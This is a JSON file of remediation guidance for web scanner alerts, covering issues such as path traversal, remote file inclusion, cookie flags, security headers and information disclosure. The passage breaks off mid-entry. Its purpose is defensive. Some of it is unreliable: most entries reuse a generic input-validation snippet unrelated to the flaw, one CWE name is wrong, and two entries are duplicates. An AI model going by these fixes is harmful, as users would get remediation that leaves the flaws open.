[
  {
    "pluginId": 0,
    "title": "Directory Browsing",
    "defaultRisk": "Medium",
    "cweid": 548,
    "description": "Directory browsing vulnerabilities occur when web servers are configured to allow directory listings, enabling attackers to browse directory contents and discover sensitive files, configuration files, backup files, or source code that should not be publicly accessible.",
    "simplified_description": "Your website is allowing visitors to see a list of all files in your directories, like leaving your filing cabinet drawers open and letting anyone rummage through them. Attackers can exploit this to find sensitive files, backup copies, configuration files, or source code that helps them plan further attacks against your application.",
    "solution": "Disable directory browsing in web server configuration and ensure proper access controls are in place for all directories.",
    "simplified_solution": "Immediately disable directory browsing on your web server by adding 'Options -Indexes' to Apache configuration or 'autoindex off;' to Nginx configuration. Ensure every directory has an index file (index.html, index.php) or proper access controls. Review and secure sensitive directories, implement proper file permissions, and regularly audit your directory structure for exposed sensitive information.",
    "references": [
      {
        "name": "OWASP Directory Listing",
        "url": "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/04-Review_Webserver_Metadata_for_Information_Leakage.html"
      },
      {
        "name": "CWE-548: Exposure of Directory Listing",
        "url": "https://cwe.mitre.org/data/definitions/548.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 2,
    "title": "Private IP Disclosure",
    "defaultRisk": "Medium",
    "cweid": "200",
    "description": "Private IP disclosure occurs when web applications reveal internal IP addresses in responses, headers, or error messages, potentially exposing network infrastructure to attackers.",
    "simplified_description": "Your application is leaking private IP addresses - like showing your home address on public documents. This reveals internal network details to attackers who can use this information for network reconnaissance and targeted attacks against your infrastructure.",
    "solution": "Remove private IP addresses from all user-facing content and implement proper network boundary protection.",
    "simplified_solution": "Replace all private IP references with domain names, configure reverse proxies properly, and ensure error messages don't expose internal addresses. Use network address translation (NAT) and proper firewall rules to hide internal infrastructure.",
    "references": [
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 3,
    "title": "Session ID in URL Rewrite",
    "defaultRisk": "High",
    "cweid": "200",
    "description": "Session ID in URL rewrite vulnerabilities occur when applications include session identifiers in URLs, making them visible in browser history, server logs, referrer headers, and bookmarks, allowing attackers to hijack user sessions through session fixation or session stealing attacks.",
    "simplified_description": "Your application is exposing session IDs in web addresses, like printing your membership card number on every receipt you hand out. Anyone who sees these URLs - in browser history, server logs, or shared links - can steal the user's session and impersonate them, accessing their accounts, personal data, and performing actions as if they were the legitimate user.",
    "solution": "Use cookies for session management instead of URL rewriting, implement secure session handling, and add additional authentication mechanisms for sensitive operations.",
    "simplified_solution": "Immediately switch from URL-based session management to secure cookie-based sessions. Enable HttpOnly, Secure, and SameSite attributes on session cookies. Implement session regeneration on login, set appropriate session timeouts, and add additional verification like CSRF tokens for sensitive actions. Ensure session IDs are never exposed in URLs or logs.",
    "references": [
      {
        "name": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "OWASP Top Ten A01:2021 - Broken Access Control",
        "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Configure secure session cookies",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// SECURE SESSION:\napp.use(session({\n  name: 'sessionId',\n  secret: process.env.SESSION_SECRET,\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict',\n  maxAge: 1800000 // 30 minutes\n}));"
      }
    ]
  },
  {
    "pluginId": 6,
    "title": "Path Traversal",
    "defaultRisk": "High",
    "cweid": "22",
    "description": "Path Traversal vulnerabilities allow attackers to read arbitrary files on the server's file system, potentially exposing sensitive configuration files, source code, or data.",
    "simplified_description": "Your application has a security weakness that allows attackers to access files on your server that they shouldn't be able to see. This is like leaving doors unlocked in a building - attackers can walk through corridors and peek into rooms they're not supposed to access. They could potentially read sensitive files like database credentials, user data, or system configuration files.",
    "solution": "Implement proper input validation and use secure file access methods that prevent directory traversal attacks.",
    "simplified_solution": "Add proper input validation to sanitize user input, restrict file access to specific directories only, use absolute file paths instead of relative ones, and implement proper access controls to ensure users can only access files they're authorized to see.",
    "references": [
      {
        "name": "OWASP Path Traversal",
        "url": "https://owasp.org/www-community/attacks/Path_Traversal"
      },
      {
        "name": "CWE-22: Improper Limitation of a Pathname to a Restricted Directory",
        "url": "https://cwe.mitre.org/data/definitions/22.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Node.js",
        "solution_description": "Validate filenames in '{{param}}' to prevent directory climbing.",
        "affected_files": "File handlers in {{filename}}",
        "code": "// ❌ VULNERABLE:\n// Attacker sent: {{evidence}}\nconst filePath = path.join(__dirname, 'public', req.query.{{param}});\nres.sendFile(filePath);\n\n// ✅ SECURE:\nconst safeFilename = path.basename(req.query.{{param}}); // Strips ../\nconst filePath = path.join(__dirname, 'public', safeFilename);"
      }
    ]
  },
  {
    "pluginId": 7,
    "title": "Remote File Inclusion",
    "defaultRisk": "Critical",
    "cweid": "98",
    "description": "Remote File Inclusion (RFI) vulnerabilities allow attackers to include remote files, potentially leading to remote code execution, data theft, or complete system compromise.",
    "simplified_description": "Your application has a critical security flaw that allows attackers to load files from external websites into your application. This is like giving strangers the keys to your house and letting them bring in whatever they want - they could bring malicious code that takes over your entire application.",
    "solution": "Disable remote file inclusion in PHP configuration and implement strict input validation with whitelisting for all file inclusion operations.",
    "simplified_solution": "Turn off remote file inclusion features in your PHP configuration, validate all file inputs against an approved list of allowed files, use absolute paths instead of user-supplied paths.",
    "references": [
      {
        "name": "OWASP Remote File Inclusion",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/File_Inclusion_Cheat_Sheet.html"
      },
      {
        "name": "CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program",
        "url": "https://cwe.mitre.org/data/definitions/98.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10003,
    "title": "Vulnerable JavaScript Library",
    "defaultRisk": "Medium",
    "cweid": 1104,
    "description": "The application uses vulnerable JavaScript libraries containing known security flaws that can be exploited for attacks such as cross-site scripting (XSS), data theft, or remote code execution.",
    "simplified_description": "Your website is using outdated JavaScript libraries that have known security vulnerabilities, like using old locks that thieves know how to pick. Attackers can exploit these known weaknesses to inject malicious code, steal user data, or compromise your website's security.",
    "solution": "Update all vulnerable JavaScript libraries to the latest secure versions and implement dependency management to prevent future use of vulnerable components.",
    "simplified_solution": "Update jQuery, Bootstrap, and other JavaScript libraries to their latest stable versions immediately. Use npm audit or similar tools to scan for vulnerabilities, implement automated dependency checking in your build process, and establish a regular schedule for reviewing and updating all third-party libraries and dependencies.",
    "references": [
      {
        "name": "OWASP Dependency Check",
        "url": "https://owasp.org/www-project-dependency-check/"
      },
      {
        "name": "CWE-1104: Use of Unvalidated Input",
        "url": "https://cwe.mitre.org/data/definitions/1104.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10010,
    "title": "Cookie No HttpOnly Flag",
    "defaultRisk": "Medium",
    "cweid": 1004,
    "description": "Cookies are being set without the HttpOnly flag, making them accessible to client-side scripts. This creates a significant security vulnerability where malicious JavaScript can steal session cookies and other sensitive cookie data, leading to session hijacking and authentication bypass.",
    "simplified_description": "Your website is allowing JavaScript code to read cookies, which is like leaving your house keys on the kitchen table where anyone can grab them. Attackers can inject malicious scripts onto your pages and steal user session cookies, allowing them to impersonate legitimate users and access their accounts without passwords.",
    "solution": "Configure all cookies to include the HttpOnly flag to prevent client-side script access. This should be implemented at the application level for session cookies and any cookies containing sensitive information. Additionally, ensure proper cookie security configurations including Secure and SameSite attributes.",
    "simplified_solution": "Update your web application to mark all cookies as HttpOnly. This tells browsers that cookies should only be accessed by the server, not by JavaScript. Start with session cookies first, then apply to all cookies containing sensitive information. Test your application thoroughly to ensure no functionality breaks.",
    "references": [
      {
        "name": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
      },
      {
        "name": "OWASP HTTP Headers Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html"
      },
      {
        "name": "MDN HttpOnly Documentation",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#HttpOnly"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10011,
    "title": "Cookie Without Secure Flag",
    "defaultRisk": "High",
    "cweid": 614,
    "description": "Cookies are being transmitted over unencrypted HTTP connections without the Secure flag, making them vulnerable to interception and theft through man-in-the-middle attacks. This allows attackers to capture sensitive cookies such as session tokens, authentication credentials, and user data on insecure networks.",
    "simplified_description": "Your website is sending cookies over unencrypted connections, like sending postcards through the mail where anyone can read them. Attackers on the same network (like public Wi-Fi) can easily intercept and steal these cookies, allowing them to hijack user sessions and access accounts without passwords.",
    "solution": "Configure all cookies to include the Secure flag to ensure they are only transmitted over HTTPS connections. This includes session cookies, authentication tokens, and any cookies containing sensitive information. Implement proper SSL/TLS termination and ensure all sensitive pages use HTTPS.",
    "simplified_solution": "Update your web application to mark all cookies as Secure, which tells browsers to only send them over encrypted HTTPS connections. This prevents cookie theft on unsecure networks. Start with session cookies first, then apply to all cookies containing sensitive data. Ensure your entire site properly supports HTTPS before implementing.",
    "references": [
      {
        "name": "OWASP Transport Layer Security Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html"
      },
      {
        "name": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
      },
      {
        "name": "NIST SP 800-52 Rev 1",
        "url": "https://csrc.nist.gov/publications/detail/sp/800-52/rev-1/final"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10015,
    "title": "Re-examine Cache-control Directives",
    "defaultRisk": "Low",
    "cweid": 525,
    "description": "Improper cache control directives allow sensitive information to be stored in intermediary caches, browser caches, or proxy servers. When cache headers are missing, misconfigured, or overly permissive, confidential data may be cached and exposed to unauthorized users, leading to information disclosure, privacy violations, and potential security breaches. This vulnerability affects sensitive pages containing personal information, financial data, or authenticated content.",
    "simplified_description": "Your website is not properly controlling how web browsers and intermediary servers store copies of your pages. This is like leaving sensitive documents in public recycling bins where anyone can find them. When users access sensitive information, copies may be stored on their computers or network devices, allowing other people to later access this confidential data even after the original user has logged out.",
    "solution": "Implement proper cache control headers to prevent caching of sensitive content, ensure secure caching policies are applied consistently, and validate cache directive implementation across all application responses.",
    "simplified_solution": "Immediately add proper cache control headers to prevent sensitive information from being stored. Use 'Cache-Control: no-store, no-cache, must-revalidate' for authenticated pages, 'Cache-Control: private' for user-specific content, and appropriate caching policies for public content. Ensure all sensitive pages include 'Pragma: no-cache' and 'Expires: 0' headers for maximum compatibility. Test your implementation by checking browser storage and intermediate cache behavior.",
    "references": [
      {
        "name": "OWASP HTTP Cache Headers Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Cache_Headers_Cheat_Sheet.html"
      },
      {
        "name": "MDN Web Docs - HTTP Caching",
        "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Caching"
      },
      {
        "name": "CWE-525: Use of Web Browser Cache Containing Sensitive Information",
        "url": "https://cwe.mitre.org/data/definitions/525.html"
      },
      {
        "name": "RFC 7234 - Hypertext Transfer Protocol (HTTP/1.1): Caching",
        "url": "https://tools.ietf.org/html/rfc7234"
      },
      {
        "name": "OWASP A05:2021 - Security Misconfiguration",
        "url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10017,
    "title": "Cross-Domain JavaScript Source File Inclusion",
    "defaultRisk": "Medium",
    "cweid": 829,
    "description": "Cross-domain JavaScript source file inclusion vulnerabilities occur when applications include JavaScript files from untrusted or unauthorized external domains, potentially allowing attackers to inject malicious scripts, steal sensitive data, or bypass security controls.",
    "simplified_description": "Your application is loading JavaScript files from external websites without proper verification, like inviting strangers to bring electrical appliances into your home and plug them into your wall outlets. Attackers can supply malicious JavaScript that runs on your site, steals user data, bypasses security controls, or attacks your users directly.",
    "solution": "Implement Content Security Policy (CSP), use Subresource Integrity (SRI) validation, whitelist allowed script sources, and avoid including JavaScript files from untrusted domains.",
    "simplified_solution": "Create a strict Content Security Policy that only allows JavaScript from your own domain and trusted CDNs, use Subresource Integrity (SRI) hashes to verify external scripts haven't been tampered with, download and host third-party scripts locally instead of linking to external sites, and regularly audit all included JavaScript files for security issues.",
    "references": [
      {
        "name": "OWASP Content Security Policy",
        "url": "https://owasp.org/www-project-secure-headers/#content-security-policy"
      },
      {
        "name": "CWE-829: Inclusion of Functionality from Untrusted Control Sphere",
        "url": "https://cwe.mitre.org/data/definitions/829.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10019,
    "title": "Content-Type Header Missing",
    "defaultRisk": "Medium",
    "cweid": "173",
    "description": "Missing Content-Type header can lead to content sniffing vulnerabilities where browsers misinterpret file types and execute malicious scripts.",
    "simplified_description": "Your web server isn't properly telling browsers what type of content it's sending. This can confuse browsers and cause them to treat safe files as dangerous scripts, opening the door to cross-site scripting attacks.",
    "solution": "Set explicit Content-Type headers for all responses and configure the server to disable content sniffing.",
    "simplified_solution": "Configure your web server to always send correct Content-Type headers and add X-Content-Type-Options: nosniff header to prevent browsers from guessing file types.",
    "references": [
      {
        "name": "OWASP Content-Type Header",
        "url": "https://owasp.org/www-project-secure-headers/"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10020,
    "title": "Anti-clickjacking Header",
    "defaultRisk": "Medium",
    "cweid": "693",
    "description": "The application is missing anti-clickjacking headers, making it vulnerable to clickjacking attacks where malicious websites can embed your site in invisible iframes and trick users into clicking on hidden elements.",
    "simplified_description": "Your website is vulnerable to 'clickjacking' attacks where attackers can place your site in an invisible frame and trick users into clicking on buttons or links they can't see. This is like someone putting a clear sheet over a painting and tricking you into pressing buttons underneath without knowing what you're actually clicking.",
    "solution": "Implement X-Frame-Options and Content Security Policy frame-ancestors headers to prevent your website from being embedded in iframes on unauthorized domains.",
    "simplified_solution": "Add security headers that tell browsers not to display your website in iframes on other sites. Use X-Frame-Options: DENY or SAMEORIGIN, and implement CSP frame-ancestors directive for modern browsers.",
    "references": [
      {
        "name": "OWASP Clickjacking Defense Cheat Sheet",
        "url": "https://owasp.org/www-project-cheat-sheets/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"
      },
      {
        "name": "CWE-693: Protection Mechanism Failure",
        "url": "https://cwe.mitre.org/data/definitions/693.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10021,
    "title": "X-Content-Type-Options Header Missing",
    "defaultRisk": "Low",
    "cweid": "16",
    "description": "The application is missing the X-Content-Type-Options header, which allows browsers to perform MIME-type sniffing. This can lead to security vulnerabilities where files are interpreted differently than intended, potentially allowing XSS attacks through file uploads or content manipulation.",
    "simplified_description": "Your website is missing a security header that tells browsers not to guess the type of content they're receiving. Without this protection, browsers might incorrectly interpret uploaded files, allowing attackers to upload malicious files that get executed as scripts instead of being treated as harmless data.",
    "solution": "Add the X-Content-Type-Options: nosniff header to all HTTP responses to prevent MIME-type sniffing attacks.",
    "simplified_solution": "Add the 'X-Content-Type-Options: nosniff' header to your web server configuration or application middleware. This tells browsers to strictly follow the declared content type and not try to guess or sniff the file type.",
    "references": [
      {
        "name": "OWASP Secure Headers",
        "url": "https://owasp.org/www-project-secure-headers/"
      },
      {
        "name": "CWE-16: Configuration",
        "url": "https://cwe.mitre.org/data/definitions/16.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Set essential security headers",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ADD THESE HEADERS:\nres.set({\n  'X-Content-Type-Options': 'nosniff',\n  'X-Frame-Options': 'DENY',\n  'X-XSS-Protection': '1; mode=block'\n});"
      }
    ]
  },
  {
    "pluginId": 10023,
    "title": "Information Disclosure - Debug Error Messages",
    "defaultRisk": "Medium",
    "cweid": 200,
    "description": "The application is revealing sensitive information through debug error messages, including stack traces, database queries, file paths, and internal system details. This information exposure provides attackers with valuable intelligence about the application architecture, database schema, and potential vulnerabilities.",
    "simplified_description": "Your website is showing detailed error messages that reveal internal system information, like leaving your blueprint and server room keys on the front desk. Attackers can use this information to understand your application's structure, find security weaknesses, and plan targeted attacks against your system.",
    "solution": "Configure error handling to display generic error messages to users while logging detailed information securely on the server. Implement proper exception handling, custom error pages, and ensure debug modes are disabled in production environments. Secure log files with proper access controls.",
    "simplified_solution": "Update your application to hide detailed error messages from users and show friendly, generic error pages instead. Log the detailed technical information to secure server files that only administrators can access. Turn off all debug modes in production and test your error handling thoroughly.",
    "references": [
      {
        "name": "OWASP Error Handling Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html"
      },
      {
        "name": "CWE-209: Generation of Error Message Containing Sensitive Information",
        "url": "https://cwe.mitre.org/data/definitions/209.html"
      },
      {
        "name": "NIST SP 800-53 Rev 4",
        "url": "https://csrc.nist.gov/publications/detail/sp/800-53/rev-4/final"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10024,
    "title": "Information Disclosure - Sensitive Information in URL",
    "defaultRisk": "Medium",
    "cweid": 200,
    "description": "Sensitive information disclosure in URLs occurs when applications place confidential data such as session IDs, API keys, passwords, personal information, or other sensitive parameters in query strings or URL paths. This information gets exposed in browser history, server logs, referrer headers, proxy logs, and can be easily intercepted or shared inadvertently.",
    "simplified_description": "Your application is putting sensitive information directly in web addresses, like writing your password on a post-it note and sticking it to your computer monitor. Anyone can see this information - it gets saved in browser history, server logs, and can be seen when someone shares a link. This exposes private data that should be kept secure and makes it easy for attackers to steal account information, session tokens, or other sensitive data.",
    "solution": "Remove sensitive information from URLs and implement secure alternatives such as POST requests for sensitive operations, secure session management, proper authentication headers, and encrypted storage of sensitive data.",
    "simplified_solution": "1) Never put passwords, session IDs, API keys, or personal data in URLs 2) Use POST requests instead of GET for sensitive operations 3) Store sensitive data in secure server-side sessions 4) Use proper HTTP headers for authentication (Authorization header) 5) Implement secure session management with cookies 6) Use encrypted tokens instead of raw sensitive data 7) Review all URL parameters and move sensitive ones to POST body or session storage.",
    "references": [
      {
        "name": "OWASP Top Ten A01:2021 - Broken Access Control",
        "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
      },
      {
        "name": "RFC 2616 - HTTP/1.1",
        "url": "https://www.rfc-editor.org/rfc/rfc2616"
      },
      {
        "name": "NIST SP 800-63 - Digital Identity Guidelines",
        "url": "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10025,
    "title": "Information Disclosure - Sensitive Information in URL",
    "defaultRisk": "Medium",
    "cweid": 200,
    "description": "Sensitive information disclosure in URLs occurs when applications place confidential data such as session IDs, API keys, passwords, personal information, or other sensitive parameters in query strings or URL paths. This information gets exposed in browser history, server logs, referrer headers, proxy logs, and can be easily intercepted or shared inadvertently.",
    "simplified_description": "Your application is putting sensitive information directly in web addresses, like writing your password on a post-it note and sticking it to your computer monitor. Anyone can see this information - it gets saved in browser history, server logs, and can be seen when someone shares a link. This exposes private data that should be kept secure and makes it easy for attackers to steal account information, session tokens, or other sensitive data.",
    "solution": "Remove sensitive information from URLs and implement secure alternatives such as POST requests for sensitive operations, secure session management, proper authentication headers, and encrypted storage of sensitive data.",
    "simplified_solution": "1) Never put passwords, session IDs, API keys, or personal data in URLs 2) Use POST requests instead of GET for sensitive operations 3) Store sensitive data in secure server-side sessions 4) Use proper HTTP headers for authentication (Authorization header) 5) Implement secure session management with cookies 6) Use encrypted tokens instead of raw sensitive data 7) Review all URL parameters and move sensitive ones to POST body or session storage.",
    "references": [
      {
        "name": "OWASP Top Ten A01:2021 - Broken Access Control",
        "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
      },
      {
        "name": "CWE-200: Information Exposure",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      },
      {
        "name": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
      },
      {
        "name": "RFC 2616 - HTTP/1.1",
        "url": "https://www.rfc-editor.org/rfc/rfc2616"
      },
      {
        "name": "NIST SP 800-63 - Digital Identity Guidelines",
        "url": "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10027,
    "title": "Information Disclosure - Suspicious Comments",
    "defaultRisk": "Low",
    "cweid": 200,
    "description": "Information disclosure through suspicious comments occurs when developers leave sensitive information in code comments, including debugging notes, TODO comments with security implications, hardcoded credentials, or references to internal systems that can be discovered by attackers examining the source code or compiled output.",
    "simplified_description": "Your application code contains sensitive information in comments, like leaving notes about security weaknesses, temporary passwords, or internal system details that attackers can read. These comments act as a roadmap for attackers, showing them exactly where your vulnerabilities are located and how to exploit them.",
    "solution": "Remove all sensitive information from code comments before deployment, implement code review processes to catch information leaks, and use automated scanning tools to detect potentially dangerous comments in production code.",
    "simplified_solution": "Clean all code comments before deploying to production, removing any information about security issues, temporary credentials, debugging notes, or internal system details. Implement automated code scanning to catch sensitive comments, establish clear coding standards about what can be commented, and make code review mandatory to prevent accidental information disclosure.",
    "references": [
      {
        "name": "OWASP Code Review Guide",
        "url": "https://owasp.org/www-project-code-review-guide/"
      },
      {
        "name": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
        "url": "https://cwe.mitre.org/data/definitions/200.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10028,
    "title": "Off-site Redirect",
    "defaultRisk": "Low",
    "cweid": "601",
    "description": "The application contains off-site redirect functionality that may not properly validate redirect targets. This can lead to security issues where users can be redirected to malicious websites, potentially enabling phishing attacks or malware distribution.",
    "simplified_description": "Your application has a feature that redirects users to other websites, but it may not properly check if those websites are safe. This is like giving visitors directions to any address they ask for - they could be directed to fake websites designed to steal their login information or install malware.",
    "solution": "Implement strict validation for all redirect targets using a whitelist approach and avoid using user-supplied input directly for redirection.",
    "simplified_solution": "Create a list of approved external websites, validate all redirect requests against this list, and use indirect references or tokens instead of direct URLs when possible.",
    "references": [
      {
        "name": "OWASP Top 10 - A01 Broken Access Control",
        "url": "https://owasp.org/www-project-top-ten/2017/A1_2017-Broken_Access_Control"
      },
      {
        "name": "CWE-601: URL Redirection to Untrusted Site",
        "url": "https://cwe.mitre.org/data/definitions/601.html"
      }
    ],
    "code_solution_samples": [
      {
        "type": "Quick Fix Implementation",
        "solution_description": "Validate and sanitize all external input data",
        "affected_files": "Authentication controllers, API endpoints, form handlers, middleware files",
        "code": "// ALWAYS VALIDATE USER INPUT:\nconst userInput = req.body.data;\nconst sanitized = validator.escape(userInput);\nconst validated = Joi.validate(sanitized, schema);\n\n// NEVER TRUST EXTERNAL DATA"
      }
    ]
  },
  {
    "pluginId": 10029,
    "title": "Cookie Poisoning",
    "defaultRisk": "Medium",
    "cweid": "565",
    "description": "Cookie poisoning vulnerabilities occur when applications accept and process cookie values without proper validation, allowing attackers to manipulate cookie data to bypass security controls, escalate privileges, or perform unauthorized actions.",
    "simplified_description": "Your application has a security weakness in how it handles cookies - it's like accepting a visitor's pass without checking if it's been forged. Attackers can modify cookie values to impersonate other users, bypass authentication, or gain unauthorized access to sensitive functionality by simply changing cookie values in their browser.",
    "solution": "Implement secure cookie handling with proper validation, encryption, and integrity checks to prevent cookie manipulation attacks.",
    "simplified_solution": "Add secure cookie configuration with HttpOnly, Secure, and SameSite attributes. Encrypt sensitive cookie data and implement integrity checks using digital signatures. Never trust cookie values without proper validation and never store sensitive information in cookies without encryption.",
    "references": [
      {
        "name": "OWASP Session Management Cheat Sheet",
        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html"
      },
      {
